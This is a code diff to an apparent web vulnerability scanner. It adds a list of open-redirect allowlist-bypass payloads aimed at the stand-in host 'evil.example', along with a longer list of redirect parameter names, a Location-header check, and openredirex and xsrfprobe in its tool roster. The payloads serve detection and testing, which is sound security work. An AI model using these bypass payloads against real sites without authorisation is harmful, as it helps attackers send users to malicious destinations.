@@ -211,8 +211,31 @@ _SQL_ERRORS = [
     "quoted string not properly terminated", "sql syntax.*mysql", "mysqli_",
     "pg_query", "psql:", "sqlite3::", "odbc sql", "microsoft ole db",
 ]
-_REDIRECT_PARAMS = {"redirect", "url", "next", "return", "returnurl", "dest", "destination",
-                    "go", "target", "rurl", "redir", "continue", "forward"}
+_REDIRECT_PARAMS = {"redirect", "redirect_uri", "redirect_url", "redirecturl", "url", "uri",
+                    "next", "return", "returnurl", "return_url", "returnto", "return_to",
+                    "dest", "destination", "continue", "goto", "go", "out", "target", "to",
+                    "link", "forward", "callback", "checkout_url", "r", "u", "rurl", "redir",
+                    "view", "image_url", "domain", "window", "path", "page"}
+# Attacker marker host + real allowlist-BYPASS payload forms (the OpenRedireX / Burp technique,
+# generalized). Every payload aims Location at the marker host through a different parser-confusion
+# trick, so a flawed allowlist (startswith / contains / naive-parse) still lands off-site. Confirmed
+# via the Location header WITHOUT following (no egress needed, unlike a follow-the-redirect tool).
+_OR_HOST = "evil.example"
+_OR_PAYLOADS = (
+    f"https://{_OR_HOST}/x",            # naive
+    f"http://{_OR_HOST}/x",
+    f"//{_OR_HOST}/x",                  # protocol-relative
+    f"///{_OR_HOST}/x",
+    f"////{_OR_HOST}/x",
+    f"https:{_OR_HOST}/x",             # missing slashes
+    f"https:/{_OR_HOST}/x",
+    rf"/\{_OR_HOST}/x",                 # backslash confusion
+    rf"\/\/{_OR_HOST}/x",
+    f"https://trusted.com@{_OR_HOST}/x",   # userinfo bypass (allowlist 'startswith trusted')
+    f"https://{_OR_HOST}/?x=trusted.com",  # contains-check bypass
+    f"https://{_OR_HOST}#trusted.com",
+    f"https://{_OR_HOST}%2f%2e%2e",        # path-normalise confusion
+)
 
 
 def _req(method, url, param, value, cookie, follow=True):
@@ -303,28 +326,43 @@ def verify_lfi(url: str, param: str, method: str, cookie: str) -> tuple[bool, st
     return False, "no file-read signature"
 
 
+def _redirect_marker_host(loc: str) -> str:
+    """Normalise a Location value (protocol-relative, backslash, missing-slash forms) and return
+    its effective host, so a bypass payload that lands off-site is recognised however it's encoded."""
+    if not loc:
+        return ""
+    lc = loc.strip().replace("\\", "/")
+    if lc.startswith("//"):
+        lc = "http:" + lc
+    elif lc.lower().startswith(("https:", "http:")) and "//" not in lc.split(":", 1)[1][:2]:
+        # 'https:evil.example' -> 'https://evil.example'
+        scheme, rest = lc.split(":", 1)
+        lc = f"{scheme}://{rest.lstrip('/')}"
+    return (urlsplit(lc).hostname or "").lower()
+
+
 def verify_open_redirect(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
-    """Only meaningful on redirect-ish params: inject an external URL and confirm the app
-    issues a 30x Location to it (do NOT follow redirects)."""
+    """Open redirect on redirect-ish params. Tries a set of allowlist-BYPASS payloads (the real
+    OpenRedireX/Burp technique, generalised) and confirms via the Location header pointing at our
+    marker host — WITHOUT following the redirect (no external egress needed). Also catches
+    body-based redirects (meta refresh / window.location)."""
     if param.lower() not in _REDIRECT_PARAMS:
         return False, "param not redirect-like"
-    evil = "https://evil.example/x"
-    try:
-        r = _req(method, url, param, evil, cookie, follow=False)
-    except Exception as exc:  # noqa: BLE001
-        return False, f"replay error: {exc}"
-    # 1) HTTP 30x Location header
-    loc = r.headers.get("location", "")
-    if r.status_code in (301, 302, 303, 307, 308) and "evil.example" in loc:
-        return True, f"30x redirect to {loc}"
-    # 2) body-based redirect: meta refresh / window.location / anchor to the injected URL
-    body = r.text.lower()
-    if "evil.example" in body:
-        for pat in ("http-equiv=\"refresh\"", "http-equiv='refresh'", "window.location",
-                    "location.href", "location.replace", "location.assign"):
-            if pat in body:
-                return True, f"body-based redirect ({pat}) to evil.example"
-    return False, f"no external redirect (status {r.status_code})"
+    for pay in _OR_PAYLOADS:
+        try:
+            r = _req(method, url, param, pay, cookie, follow=False)
+        except Exception:  # noqa: BLE001 - try the next payload
+            continue
+        loc = r.headers.get("location", "")
+        if r.status_code in (301, 302, 303, 307, 308) and _redirect_marker_host(loc) == _OR_HOST:
+            return True, f"30x Location to {loc[:70]} (payload: {pay})"
+        body = (r.text or "").lower()
+        if _OR_HOST in body:
+            for pat in ("http-equiv=\"refresh\"", "http-equiv='refresh'", "window.location",
+                        "location.href", "location.replace", "location.assign"):
+                if pat in body:
+                    return True, f"body redirect ({pat}) to {_OR_HOST} (payload: {pay})"
+    return False, "no external redirect across bypass payloads"
 
 
 def verify_stored_xss(target: Target, param: str, cookie: str) -> tuple[bool, str]:
@@ -551,12 +589,14 @@ _ROSTER_CAT = {
     "crlfuzz": "crlf-injection", "sstimap": "ssti", "lfi_fuzz": "file-inclusion",
     "rfi_oast": "rfi", "dotdotpwn": "file-inclusion", "schemathesis": "api-fuzz",
     "jwt_tool": "jwt", "graphw00f": "graphql", "gitleaks": "secret", "trufflehog": "secret",
+    "openredirex": "open-redirect", "xsrfprobe": "csrf",
 }
 # The full detection roster the mega scan runs over the SAFE frontier. nuclei + sqlmap are
 # already hand-coded above; ZAP is intentionally excluded (its full-scan re-crawls and can
 # crash fragile targets — the failure we hit on WAVSEP; use `launch -w full` if you want it).
 _MEGA_ROSTER = ["dalfox", "ghauri", "lfi_fuzz", "commix", "crlfuzz", "sstimap", "rfi_oast",
-                "dotdotpwn", "schemathesis", "jwt_tool", "graphw00f", "gitleaks", "trufflehog"]
+                "dotdotpwn", "openredirex", "xsrfprobe", "schemathesis", "jwt_tool",
+                "graphw00f", "gitleaks", "trufflehog"]
 
 
 # Roster tools that loop one subprocess PER URL (expensive at scale) vs tools that batch a whole
